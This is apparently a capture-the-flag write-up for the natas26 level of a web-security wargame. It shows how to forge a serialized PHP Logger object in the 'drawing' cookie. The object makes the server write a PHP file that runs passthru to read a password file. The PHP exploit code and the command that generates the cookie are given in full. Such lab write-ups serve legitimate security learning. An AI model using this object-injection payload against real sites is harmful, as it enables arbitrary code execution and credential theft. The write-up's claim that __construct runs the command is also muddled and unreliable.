# natas26

This problem is based on deserialization. If you open the cookies, you see `drawing` cookie which is base64 encoded, and when you decode it, you see php arrays and serials for each image you creat with data as x1, x2, etc. When you open the source code, th `Logger` class creates "magic functions" `__construct` and `__destruct` which you can do serialization and unserialization of (read about php class log serializations.)

So our goal will be to make a cookie which will be unserialized by the server and regarded as Logger. This will be executed to fetch our password from `/etc/natas_webpass/natas27`. So let's build the cookie-
```php
<?php
class Logger
{
    private $logFile;
    private $initMsg;
    private $exitMsg;
    function __construct($file)
    {
        // initialise variables
        $this->initMsg="Hello\n";
        $this->exitMsg="Goodbye <? passthru('cat /etc/natas_webpass/natas27'); ?>\n\n";
        $this->logFile = "img/password.php";
    }
}
$object = new Logger("Security Times");
echo "Serialized Object : ".serialize($object)."<pre>\n\n</pre>Base64 encoded serialized object : ".urlencode(base64_encode(serialize($object)));
?>
```
The above codes creates an object of class `”Logger“`. Creation of an object sends a call to `__construct()` function which executes our command and stores the result in `img/password.php` file.
Now what we do to get the appropriate cookie is to make a php file with above conde in it, run -
```bash
php natas26_phpcode.php
```
And we get the serialized object + basee64 encoded version too, which is inputted as drawing cookie and refreshed. Now traverse to `/img/password.php` and you get your password for the next level.
